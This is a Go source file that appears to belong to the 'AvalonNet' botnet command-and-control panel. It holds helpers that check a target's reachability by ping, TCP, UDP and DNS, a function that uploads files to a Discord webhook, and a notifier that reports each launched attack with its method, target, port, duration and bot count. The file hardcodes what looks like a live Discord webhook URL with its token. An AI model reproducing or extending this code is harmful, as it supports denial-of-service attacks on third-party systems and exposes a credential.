package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/d1manpro/checkhost"
)

var checkHostClient = checkhost.New()

func CheckPing(target string) (checkhost.PingResult, error) {
	resp, err := checkHostClient.CheckPing(checkhost.RequestData{Host: target, MaxNodes: 5})
	if err != nil {
		return nil, err
	}
	return checkHostClient.WaitPingResult(resp.RequestID, 30*time.Second, 2*time.Second)
}

func CheckTCP(target string, port string) (checkhost.TCPResult, error) {
	targetWithPort := fmt.Sprintf("%s:%s", target, port)
	resp, err := checkHostClient.CheckTCP(checkhost.RequestData{Host: targetWithPort, MaxNodes: 5})
	if err != nil {
		return nil, err
	}
	return checkHostClient.WaitTCPResult(resp.RequestID, 30*time.Second, 2*time.Second)
}

func CheckUDP(target string, port string) (checkhost.UDPResult, error) {
	targetWithPort := fmt.Sprintf("%s:%s", target, port)
	resp, err := checkHostClient.CheckUDP(checkhost.RequestData{Host: targetWithPort, MaxNodes: 5})
	if err != nil {
		return nil, err
	}
	return checkHostClient.WaitUDPResult(resp.RequestID, 30*time.Second, 2*time.Second)
}

func CheckDNS(domain string) (checkhost.DNSResult, error) {
	resp, err := checkHostClient.CheckDNS(checkhost.RequestData{Host: domain, MaxNodes: 5})
	if err != nil {
		return nil, err
	}
	return checkHostClient.WaitDNSResult(resp.RequestID, 30*time.Second, 2*time.Second)
}

func sendToDiscordWebhook(webhookURL string, filename string, message string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filename))
	if err != nil {
		return err
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	_ = writer.WriteField("content", message)

	err = writer.Close()
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("Discord webhook returned status %d", resp.StatusCode)
	}

	return nil
}

type DiscordWebhook struct {
	Embeds []DiscordEmbed `json:"embeds"`
}

type DiscordEmbed struct {
	Title       string         `json:"title"`
	Description string         `json:"description"`
	Color       int            `json:"color"`
	Fields      []DiscordField `json:"fields"`
	Footer      DiscordFooter  `json:"footer"`
	Timestamp   string         `json:"timestamp"`
}

type DiscordField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type DiscordFooter struct {
	Text string `json:"text"`
}

func sendAttackWebhook(method string, target string, port int, duration int, ipInfo *IPInfo, sender string, bots int, isAPI bool) {
	webhookURL := "https://discord.com/api/webhooks/1464836206566314130/kpo5Zzwu7n_5ocf6ppxWdQa-5Tw_rFUf74zvGYq682nd-U_JZKoytXISzIcgdCZYChZB"

	title := "🚀 New Attack Launched!"
	if isAPI {
		title = "🔌 New API Attack Launched!"
	}

	embed := DiscordEmbed{
		Title: title,
		Color: 0x7d007d,
		Fields: []DiscordField{
			{Name: "👤 Sender", Value: sender, Inline: true},
			{Name: "📡 Method", Value: method, Inline: true},
			{Name: "🎯 Target", Value: target, Inline: true},
			{Name: "🔌 Port", Value: fmt.Sprintf("%d", port), Inline: true},
			{Name: "🕒 Duration", Value: fmt.Sprintf("%d seconds", duration), Inline: true},
			{Name: "🤖 Bots count", Value: fmt.Sprintf("%d", bots), Inline: true},
			{Name: "🌍 Country", Value: ipInfo.Country, Inline: true},
			{Name: "🏢 Org", Value: ipInfo.Org, Inline: true},
			{Name: "📍 Region", Value: ipInfo.Region, Inline: true},
		},
		Footer: DiscordFooter{
			Text: "AvalonNet CNC Notification System",
		},
		Timestamp: time.Now().Format(time.RFC3339),
	}

	payload := DiscordWebhook{
		Embeds: []DiscordEmbed{embed},
	}

	jsonPayload, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}
